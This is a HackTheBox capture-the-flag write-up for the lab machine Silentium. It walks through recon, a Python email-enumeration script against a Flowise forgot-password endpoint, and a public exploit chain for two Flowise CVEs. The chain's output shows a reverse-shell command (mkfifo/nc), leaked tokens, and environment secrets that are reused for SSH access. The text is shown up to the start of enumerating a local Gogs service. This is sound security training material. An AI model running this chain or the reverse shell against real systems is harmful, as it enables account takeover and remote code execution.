---
layout: page
title: Silentium
description: Account take over into MCP RCE.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/silentium/logo.png" title="HTB Silentium Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Silentium">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
This box won't silence us.  Let's crack Silentium!!

First things first, let's add the box to the `/etc/hosts` file.

{% capture etchosts %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~]
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1
10.129.245.103  silentium.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etchosts %}

<br />
Give nmap a run and try to identify the open ports.

{% capture nmap %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ sudo nmap -sC -sV -O -A -oN nmap silentium.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-24 08:21 EDT
Nmap scan report for silentium.htb (10.129.245.103)
Host is up (0.0014s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT     ADDRESS
1   1.00 ms 10.10.14.1
2   1.52 ms silentium.htb (10.129.245.103)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Run `curl -I` to pull the headers to try to identify technologies.

{% capture curli %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ curl -I http://silentium.htb
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 24 Aug 2026 12:31:16 GMT
Content-Type: text/html
Content-Length: 8753
Last-Modified: Mon, 16 Mar 2026 22:21:29 GMT
Connection: keep-alive
ETag: "69b88269-2231"
Accept-Ranges: bytes
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the landing page source code.

{% capture landingsource %}
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Silentium | Institutional Capital & Lending Solutions</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- Tailwind CDN -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">

  <link rel="stylesheet" href="/assets/styles.css">

  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            silent: {
              900: '#121417',
              800: '#1c1f24',
              700: '#2d3239',
              DEFAULT: '#c4a484',
              light: '#fcfaf7',
              muted: '#6b7280'
            }
          }
        }
      }
    }
  </script>
</head>

<snip>

</div>
</footer>
<script src="/assets/app.js" defer></script>
</body>
</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://silentium.htb' content=landingsource %}

<br />
Review the JavaScript code looking for anything juicy.

{% capture appjs %}
// Wait for DOM to load
document.addEventListener("DOMContentLoaded", () => {

  // Navbar scroll behavior
  const nav = document.getElementById("nav");
  window.addEventListener("scroll", () => {
    if (window.scrollY > 60) {
      nav.classList.add("bg-white/95", "backdrop-blur", "shadow-sm");
    } else {
      nav.classList.remove("bg-white/95", "backdrop-blur", "shadow-sm");
    }
  });

  // Calculator logic
  function calc(amount, term, rate = 4.5) {
    const r = rate / 100 / 12;

    // Safety guard
    if (r === 0 || term === 0) return 0;

    return (
      amount * r * Math.pow(1 + r, term)
    ) / (
      Math.pow(1 + r, term) - 1
    );
  }

  const amount = document.getElementById("amount");
  const term = document.getElementById("term");
  const monthly = document.getElementById("monthly");
  const amountLabel = document.getElementById("amountLabel");
  const termLabel = document.getElementById("termLabel");

  function update() {
    const a = Number(amount.value);
    const t = Number(term.value);

    amountLabel.textContent = `$${a.toLocaleString()}`;
    termLabel.textContent = t;
    monthly.textContent = `$${calc(a, t).toFixed(2)}`;
  }

  amount.addEventListener("input", update);
  term.addEventListener("input", update);

  // Initial render
  update();
});
{% endcapture %}
{% include terminal.html language='javascript' title='app.js' content=appjs %}

<br />
Run the ffuf to try and brute-force some directories.

{% capture ffuf %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://silentium.htb/FUZZ -e .html,.txt,.bak -fw 1866

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Extensions       : .html .txt .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1866
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 38ms]
:: Progress: [5095328/5095328] :: Job [1/1] :: 351 req/sec :: Duration: [1:19:19] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffuf %}

<br />
Fuzz Faster U Fool for some sweet sub directories.

{% capture ffufsubdomains %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 33ms]
:: Progress: [2171687/2171687] :: Job [1/1] :: 803 req/sec :: Duration: [0:20:42] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffufsubdomains %}

<br />
Update the `/etc/hosts` with the newly found subdomain.

{% capture updateetchosts %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1
10.129.245.103  silentium.htb staging.silentium.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=updateetchosts %}

<br />
Give `curl -I` to pull the header to try and finger-print the tech.

{% capture curlistaging %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ curl -I http://staging.silentium.htb
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 24 Aug 2026 13:04:19 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 3142
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Mon, 11 Aug 2025 12:14:01 GMT
ETag: W/"c46-198990d4728"
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curlistaging %}

<br />
Check out the staging landing page.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/staginglanding.png" title="Staging Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code and notice the Flowise title.

{% capture staginglandingsource %}
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Flowise - Build AI Agents, Visually</title>
        <link rel="icon" href="favicon.ico" />
        <!-- Meta Tags-->
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="theme-color" content="#2296f3" />
        <meta name="title" content="Flowise - Build AI Agents, Visually" />
        <meta
            name="description"
            content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
        />
        <link rel="manifest" href="manifest.json" />
        <link rel="apple-touch-icon" href="logo192.png" />
        <meta name="keywords" content="react, material-ui, workflow automation, llm, artificial-intelligence" />
        <meta name="author" content="FlowiseAI" />
        <!-- Open Graph / Facebook -->
        <meta property="og:locale" content="en_US" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="https://flowiseai.com/" />
        <meta property="og:site_name" content="flowiseai.com" />
        <meta property="og:title" content="Flowise - Build AI Agents, Visually" />
        <meta
            property="og:description"
            content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
        />
        <!-- Twitter -->

<snip>

</script>
    </body>
</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://staging.silentium.htb' content=staginglandingsource %}

<br />
Google the Flowise app to find an exploit that can be used.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/exploit.png" title="Find Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC">https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC</a>

<br />
Check the landing page, again, and note the different name that are listed under Intuitional Leadership.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/leadership.png" title="Institutional Leadership" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use those names to generate a list of potential emails using common variations of usernames and the website domain as the email domain.   

{% capture usernames %}
marcus.thorne@silentium.htb
marcus@silentium.htb
thorne@silentium.htb
mthorne@silentium.htb
m.thorne@silentium.htb
marcust@silentium.htb
marcus_thorne@silentium.htb
marcus-thorne@silentium.htb
elena.rossi@silentium.htb
elena@silentium.htb
rossi@silentium.htb
erossi@silentium.htb
e.rossi@silentium.htb
elenar@silentium.htb
rossie@silentium.htb
elena_rossi@silentium.htb
elena-rossi@silentium.htb
ben@silentium.htb
b@silentium.htb
ben1@silentium.htb
{% endcapture %}
{% include codebox.html title="usernames.txt" content=usernames %}

<br />
Test an email just to see the behavior of forgot password.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/forgot.png" title="Forgot Password" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the request in Burp so we can get a sense of the request.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/silentium/burp.png" title="Burp Suite" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a bruter that uses all the emails that we identified identified earlier against the forgot password endpoint to identify a proper email.

{% capture bruter %}
import requests

emails = [
    'marcus.thorne@silentium.htb',
    'marcus@silentium.htb',
    'thorne@silentium.htb',
    'mthorne@silentium.htb',
    'm.thorne@silentium.htb',
    'marcust@silentium.htb',
    'marcus_thorne@silentium.htb',
    'marcus-thorne@silentium.htb',
    'elena.rossi@silentium.htb',
    'elena@silentium.htb',
    'rossi@silentium.htb',
    'erossi@silentium.htb',
    'e.rossi@silentium.htb',
    'elenar@silentium.htb',
    'rossie@silentium.htb',
    'elena_rossi@silentium.htb',
    'elena-rossi@silentium.htb',
    'ben@silentium.htb',
    'b@silentium.htb',
    'ben1@silentium.htb'
]

url = 'http://staging.silentium.htb/api/v1/account/forgot-password'
headers = {
    'x-request-from': 'internal',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json'
}

for email in emails:
    data = {"user":{"email":email}}

    r = requests.post(url=url,headers=headers,json=data)
    if 'User Not Found' not in r.text:
        print('-----------------------------------')
        print(email)
        print('-----------------------------------')
{% endcapture %}
{% include terminal.html language='python' title='fuzzer.py' content=bruter %}

<br />
Run the fuzzer and identify a legitimate email.

{% capture findemail %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ python3 fuzzer.py 
-----------------------------------
ben@silentium.htb
-----------------------------------
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=findemail %}

<br />
Clone the exploit into your working directory.

{% capture cloneexploit %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ git clone https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC.git
Cloning into 'CVE-2025-58434-AND-59528-POC'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 16 (delta 6), reused 15 (delta 5), pack-reused 0 (from 0)
Receiving objects: 100% (16/16), 21.77 KiB | 21.77 MiB/s, done.
Resolving deltas: 100% (6/6), done.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=cloneexploit %}

<br />
Install the requirements for the exploit.

{% capture installrequirements %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
└──╼ [★]$ pip install -r requirements.txt 
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: requests>=2.28.0 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (2.32.3)
Requirement already satisfied: charset_normalizer<4,>=2 in /usr/lib/python3/dist-packages (from requests>=2.28.0->-r requirements.txt (line 1)) (3.4.2)
Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests>=2.28.0->-r requirements.txt (line 1)) (3.10)
Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/lib/python3/dist-packages (from requests>=2.28.0->-r requirements.txt (line 1)) (2.3.0)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests>=2.28.0->-r requirements.txt (line 1)) (2025.1.31)
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=installrequirements %}

<br />
Start a netcat listener.

{% capture startlistener %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ sudo nc -nlvp 443
Listening on 0.0.0.0 443
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=startlistener %}

<br />
Run the exploit.

{% capture runexploit %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
└──╼ [★]$ python3 main.py \
  -u http://staging.silentium.htb \
  -e ben@silentium.htb \
  --lhost 10.10.15.20 \
  --lport 443


  ███████╗██╗      ██████╗ ██╗    ██╗██╗███████╗███████╗
  ██╔════╝██║     ██╔═══██╗██║    ██║██║██╔════╝██╔════╝
  █████╗  ██║     ██║   ██║██║ █╗ ██║██║███████╗█████╗
  ██╔══╝  ██║     ██║   ██║██║███╗██║██║╚════██║██╔══╝
  ██║     ███████╗╚██████╔╝╚███╔███╔╝██║███████║███████╗
  ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝

  ════════════════════════════════════════════════════════════════════
  CVE-2025-58434 │ Account Takeover via Token Disclosure │ CVSS 9.8 Critical
  CVE-2025-59528 │ Authenticated RCE via CustomMCP Node  │ CVSS Critical    
  ════════════════════════════════════════════════════════════════════
    ⚠  FOR EDUCATIONAL / AUTHORIZED SECURITY TESTING ONLY  ⚠
  ════════════════════════════════════════════════════════════════════

  ════════════════════════════════════════════════════════════════════
    FULL CHAIN MODE  │  CVE-2025-58434 → CVE-2025-59528
  ════════════════════════════════════════════════════════════════════

  [Step 1] [CVE-2025-58434] Requesting forgot-password token ...
  [*] Endpoint : http://staging.silentium.htb/api/v1/account/forgot-password
  [*] Email    : ben@silentium.htb
  [*] HTTP 201

  ────────────────────────────────────────────────────────────────────
    LEAKED ACCOUNT DATA
  ────────────────────────────────────────────────────────────────────
  User ID       : e26c9d6c-678c-4c10-9e36-01813e8fea73
  Name          : admin
  Email         : ben@silentium.htb
  Credential    : $2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG
  Status        : active
  tempToken     : jPCYtMMqKzZ7PWi31TFcK7NacEvTlHEu5ma3VlyBaZxeZgcIZArEaNWThyWXxGS5
  tokenExpiry   : 2026-08-24T14:29:09.027Z
  ────────────────────────────────────────────────────────────────────
  [+] tempToken  : jPCYtMMqKzZ7PWi31TFcK7NacEvTlHEu5ma3VlyBaZxeZgcIZArEaNWThyWXxGS5
  [+] Expiry     : 2026-08-24T14:29:09.027Z
  [!] VULNERABLE — token disclosed without authentication!

  [Step 2] [CVE-2025-58434] Resetting password → Flowise@Pwn3d2025!
  [*] Endpoint     : http://staging.silentium.htb/api/v1/account/reset-password
  [*] New password : Flowise@Pwn3d2025!
  [*] HTTP 201
  [+] Password reset SUCCESSFUL (tempToken cleared)
  [+] Account takeover complete  →  ben@silentium.htb / Flowise@Pwn3d2025!

  [Step 3] [Auth] Logging in to extract session cookies ...
  [*] Endpoint : http://staging.silentium.htb/api/v1/auth/login
  [*] Email    : ben@silentium.htb
  [*] HTTP 200

  ────────────────────────────────────────────────────────────────────
    EXTRACTED SESSION COOKIES
  ────────────────────────────────────────────────────────────────────
  token          : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
  refreshToken   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
  connect_sid    : s%3AU4BJKyVbrhNVJ53SdtlnO2c52X8TVgXg.lTwWbe1L7IilOnyH55I%2F0kd4p5QsQT%2B...
  ────────────────────────────────────────────────────────────────────
  [+] Session cookies obtained ✓

  [Step 4] [CVE-2025-59528] Executing RCE via CustomMCP ...
  [*] Endpoint : http://staging.silentium.htb/api/v1/node-load-method/customMCP
  [*] Command  : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.20 443 >/tmp/f
  [*] Payload  : ({x:(function(){const cp=process.mainModule.require("child_process");const b64="cm0gL3Rt...

  ────────────────────────────────────────────────────────────────────
    RCE RESULT
  ────────────────────────────────────────────────────────────────────
  Mode    : Reverse Shell
  Command : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.20 443 >/tmp/f
  LHOST   : 10.10.15.20
  LPORT   : 443

  [+] Reverse shell payload fired!
  [!] Waiting for connection on 10.10.15.20:443 ...
  [!] Make sure your listener is running:  nc -lvnp 443
  ────────────────────────────────────────────────────────────────────

  ════════════════════════════════════════════════════════════════════
    CHAIN COMPLETE
  ════════════════════════════════════════════════════════════════════
  CVE-2025-58434  ✓  ATO   → ben@silentium.htb / Flowise@Pwn3d2025!
  CVE-2025-59528  ✓  RCE   → shell connecting to 10.10.15.20:443
  ════════════════════════════════════════════════════════════════════
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runexploit %}

<br />
Check the listener and catch the shell.

{% capture catchshell %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
└──╼ [★]$ sudo nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.245.103 38169
/bin/sh: can't access tty; job control turned off
/ #
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchshell %}

<br />
Check the environment variables.

{% capture checkenv %}
~ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
OLDPWD=/
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/root
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=checkenv %}

<br />
SSH into the machine using the ben username from the email earlier and the SMTP_PASSWORD from the environment variables.

{% capture ssh %}
┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
└──╼ [★]$ ssh ben@silentium.htb
The authenticity of host 'silentium.htb (10.129.245.103)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'silentium.htb' (ED25519) to the list of known hosts.
ben@silentium.htb's password: 
Permission denied, please try again.
ben@silentium.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Apr  8 07:12:54 PM UTC 2026

  System load:           0.24
  Usage of /:            82.6% of 13.37GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             259
  Users logged in:       0
  IPv4 address for eth0: 10.129.234.54
  IPv6 address for eth0: dead:beef::250:56ff:feb9:435c

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ssh %}

<br />
Get the user.txt flag.

{% capture userflag %}
Gben@silentium:~$ cat user.txt 
<redacted>
ben@silentium:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:7a:04 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.245.103/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2776sec preferred_lft 2776sec
    inet6 dead:beef::250:56ff:fe95:7a04/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:fe95:7a04/64 scope link 
       valid_lft forever preferred_lft forever
3: br-2141d27c70d6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether d2:11:f1:fd:82:96 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2141d27c70d6
       valid_lft forever preferred_lft forever
    inet6 fe80::d011:f1ff:fefd:8296/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 4e:62:24:85:e9:2d brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: veth66b70ea@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
    link/ether 9e:5b:b0:3e:c8:3e brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::9c5b:b0ff:fe3e:c83e/64 scope link 
       valid_lft forever preferred_lft forever
6: veth06c722d@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
    link/ether aa:aa:28:8c:6f:69 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::a8aa:28ff:fe8c:6f69/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Check the tcp listening port with the `ss -antlp`.

{% capture ssantlp %}
ben@silentium:/var/www/html/Silentium$ ss -antlp
State                 Recv-Q                Send-Q                                Local Address:Port                                  Peer Address:Port                Process                
LISTEN                0                     4096                                      127.0.0.1:33627                                      0.0.0.0:*                                          
LISTEN                0                     4096                                      127.0.0.1:3000                                       0.0.0.0:*                                          
LISTEN                0                     4096                                      127.0.0.1:3001                                       0.0.0.0:*                                          
LISTEN                0                     4096                                     127.0.0.54:53                                         0.0.0.0:*                                          
LISTEN                0                     4096                                        0.0.0.0:22                                         0.0.0.0:*                                          
LISTEN                0                     511                                         0.0.0.0:80                                         0.0.0.0:*                                          
LISTEN                0                     4096                                  127.0.0.53%lo:53                                         0.0.0.0:*                                          
LISTEN                0                     4096                                      127.0.0.1:8025                                       0.0.0.0:*                                          
LISTEN                0                     4096                                      127.0.0.1:1025                                       0.0.0.0:*                                          
LISTEN                0                     4096                                           [::]:22                                            [::]:*                                          
LISTEN                0                     511                                            [::]:80                                            [::]:*
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ssantlp %}

<br />
Let's check the port 3001.  Let's give it a curl to see what's running.  Note the Gogs installation and the new potential subdomain.

{% capture curlgogs %}
ben@silentium:/var/www/html/Silentium$ curl 127.0.0.1:3001
<!DOCTYPE html>
<html>
<head data-suburl="">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
	
		<meta name="author" content="Gogs" />
		<meta name="description" content="Gogs is a painless self-hosted Git service" />
		<meta name="keywords" content="go, git, self-hosted, gogs">
	
	<meta name="referrer" content="no-referrer" />
